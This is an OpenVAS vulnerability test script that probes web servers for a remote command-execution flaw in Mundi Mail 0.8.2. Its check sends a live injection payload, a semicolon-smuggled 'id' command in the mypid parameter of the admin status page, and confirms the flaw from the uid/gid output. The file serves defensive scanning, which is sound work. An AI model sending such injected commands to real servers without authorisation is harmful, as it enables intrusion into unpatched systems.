###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mundimail_41957.nasl 5323 2017-02-17 08:49:23Z teissa $
#
# Mundi Mail Multiple Remote Command Execution Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Mundi Mail is prone to multiple remote command-execution
vulnerabilities because it fails to properly validate user-
supplied input.

An attacker can exploit these issues to execute arbitrary commands
within the context of the vulnerable system.

MundiMail version 0.8.2 is vulnerable; other versions may also
be affected.";


if (description)
{
 script_id(100727);
 script_version("$Revision: 5323 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-17 09:49:23 +0100 (Fri, 17 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-08-02 14:28:14 +0200 (Mon, 02 Aug 2010)");
 script_bugtraq_id(41957);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("Mundi Mail Multiple Remote Command Execution Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/41957");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/mundimail/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/mundimail","/mail",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/admin/index.php"); 

  if(http_vuln_check(port:port, url:url,pattern:"Powered by Mundi Mail")) {
    
    url = string(dir,"/admin/status/index.php?action=stop&mypid=;id");

    if(http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(0);
